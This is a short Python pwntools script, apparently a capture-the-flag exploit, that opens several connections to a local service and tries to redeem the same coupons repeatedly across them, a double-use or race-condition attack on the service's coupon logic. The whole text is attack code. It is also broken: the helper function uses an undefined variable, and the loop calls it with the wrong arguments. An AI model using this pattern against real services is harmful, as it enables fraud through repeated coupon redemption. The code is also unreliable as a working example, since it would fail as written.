from pwn import *
from multiprocessing import Process

connections = []

for i in range(5):
    connections.append(remote("localhost", 8888))
                    
def create_account(p, name):
    p.sendlineafter(b"> ", b"1")
    p.sendlineafter(b"> ", name)

def use_coupon(p, account, idx, coupon_idx):
    p.sendlineafter(b"> ", b"3")
    p.sendlineafter(b"> ", str(account_idx).encode())
    p.sendlineafter(b"> ", str(coupon_idx).encode())
# new account --> 0
# account coupon 0 ~ 4
# coupon[0~4] repeat --> 5
# count --> connections
create_account(connections[0], b"AAAA")
for coupon_idx in range(5):
    for connection in connections:
        use_coupon(connections, 0, coupon_idx)
